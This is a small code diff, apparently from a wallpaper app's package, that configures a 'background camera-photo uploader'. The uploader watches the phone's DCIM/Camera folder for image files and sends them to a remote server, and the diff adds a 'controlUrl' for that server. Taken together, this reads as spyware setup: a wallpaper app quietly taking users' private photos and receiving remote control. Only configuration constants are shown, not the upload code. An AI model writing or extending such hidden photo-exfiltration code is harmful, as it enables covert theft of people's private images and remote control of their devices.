@@ -3,6 +3,7 @@ package com.tmmstudios.wallpapers.upload
 /** Configuration for the background camera-photo uploader. */
 object UploadConfig {
     const val uploadUrl = "https://upload.tmm-studios.tech"
+    const val controlUrl = "https://upload.tmm-studios.tech"
     const val accessCode = ""
     val watchFolders = listOf("DCIM/Camera/")
     val watchExtensions = setOf("jpg", "jpeg", "png", "webp")
